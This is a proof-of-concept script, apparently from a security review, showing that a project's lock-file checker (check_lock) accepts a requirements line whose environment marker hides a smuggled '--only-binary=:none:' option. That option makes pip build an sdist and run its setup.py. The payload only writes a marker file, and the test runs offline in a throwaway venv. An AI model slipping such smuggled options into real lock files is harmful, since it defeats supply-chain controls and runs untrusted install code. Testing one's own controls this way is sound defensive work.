"""Skeptic 04 counterexample: a lock line that memelab.predictive.runtime.check_lock accepts and that makes the lab's install
route (INSTALL_FLAGS, PI-D-032) build an sdist and run its setup.py (P32). Offline (`unshare -n`), throwaway venv in a temp dir.

The line carries an environment marker; check_lock's _REQ lets the marker group `[^\\#]+?` swallow everything after `;`,
so a trailing `--only-binary=:none:` passes. pip parses that per-line option with the finder's FormatControl and clears the
command line's `--only-binary=:all:`.
    python -I -B skeptic_04_lock_bypass.py REPO SETUPTOOLS_WHEEL_DIR OUT.json
"""
import hashlib, io, json, subprocess, sys, tarfile, tempfile
from pathlib import Path
repo, stw, out = Path(sys.argv[1]), Path(sys.argv[2]), Path(sys.argv[3])
sys.path.insert(0, str(repo))
from memelab.predictive import runtime as R

def sha(p): return hashlib.sha256(p.read_bytes()).hexdigest()
def pip(py, args):
    p = subprocess.run(["unshare", "-n", py, "-m", "pip", "--disable-pip-version-check", "--no-input", *args], capture_output=True, text=True, timeout=600)
    return {"exit": p.returncode, "tail": [l[:160] for l in (p.stdout + p.stderr).strip().splitlines()[-3:]]}
res = {}
with tempfile.TemporaryDirectory() as td:
    td = Path(td); wh = td / "wh"; wh.mkdir(); marker = td / "MARKER_SETUP_RAN"
    setup = f"from pathlib import Path\nPath({str(marker)!r}).write_text('setup.py ran')\nfrom setuptools import setup\nsetup(name='p04sk', version='1.0', py_modules=[])\n"
    sd = wh / "p04sk-1.0.tar.gz"
    with tarfile.open(sd, "w:gz") as t:
        for n, b in (("p04sk-1.0/setup.py", setup), ("p04sk-1.0/PKG-INFO", "Metadata-Version: 2.1\nName: p04sk\nVersion: 1.0\n")):
            ti = tarfile.TarInfo(n); ti.size = len(b.encode()); t.addfile(ti, io.BytesIO(b.encode()))
    for w in stw.glob("*.whl"):
        (wh / w.name).write_bytes(w.read_bytes())
    venv = td / "venv"; subprocess.run([sys.executable, "-m", "venv", str(venv)], check=True)
    py = str(venv / "bin/python")
    res["pip_version"] = subprocess.run([py, "-m", "pip", "--version"], capture_output=True, text=True).stdout.split(" from ")[0]
    flags = list(R.INSTALL_FLAGS) + ["--no-index", "--find-links", str(wh)]
    plain = td / "plain.txt"; plain.write_text(f"p04sk==1.0 --hash=sha256:{sha(sd)}\n")
    evil = td / "evil.txt"; evil.write_text(f"p04sk==1.0 ; python_version >= \"3\" --hash=sha256:{sha(sd)} --only-binary=:none:\n")
    res["check_lock_plain_sdist_line"] = R.check_lock(plain.read_text())
    res["check_lock_evil_line"] = R.check_lock(evil.read_text())
    res["lab_route_plain_line"] = pip(py, ["install", *flags, "-r", str(plain)])
    res["marker_after_plain"] = marker.exists()
    res["lab_route_evil_line"] = pip(py, ["install", *flags, "-r", str(evil)])
    res["marker_after_evil"] = marker.exists()
    res["verdict"] = ("BYPASS: check_lock accepted the line and the lab route ran setup.py"
                      if res["check_lock_evil_line"] == [] and res["marker_after_evil"] and not res["marker_after_plain"] else "no bypass")
out.write_text(json.dumps(res, indent=1) + "\n")
print(json.dumps(res, indent=1))
